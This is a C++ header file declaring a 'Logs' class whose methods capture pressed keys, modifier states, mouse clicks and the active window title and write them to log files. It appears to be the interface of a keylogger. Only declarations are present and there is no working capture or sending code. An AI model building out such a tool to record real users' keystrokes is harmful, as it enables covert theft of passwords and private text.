#pragma once

#include "stdafx.h"
#include <map>
#include <string>
#include <fstream>
#include <iostream>

#define MIN_KEY_SIZE	0x01
#define MAX_KEY_SIZE	0x15E
#define IS_MOUSE_KEY(x)	(((x) > 0 && (x) < 0x07) ? true : false)

class Logs
{
	std::ofstream	_keyFile;
	std::ofstream	_mouseFile;
	std::string		_keyFileName;
	std::string		_mouseFileName;
	std::string		_lastActiveWindow;
	std::string		_pressedKeys;
	SYSTEMTIME		_lastPrintedTime;

public:
	Logs(std::string&);
	~Logs();
	bool				openLog(std::ofstream &, std::string&) const;
	void				waitForInput(void);
	bool				checkPressedKey(char, int, char *);
	bool				checkPressedShift(void);
	bool				checkPressedAltGr(void);
	void				checkCombinedKeys(std::map<std::string, std::pair<int, bool>> &, int);
	bool				checkSpecialChar(int);
	bool				checkVerySpecialChar(int);
	void				writeLog(int);
	bool				writeMouseLog(int);
	void				deleteLog(int);
	const std::string	getActiveWindowTitle(bool);
	const std::string	&getKeyFileName(void) const;
	void				printCurrTime();
};

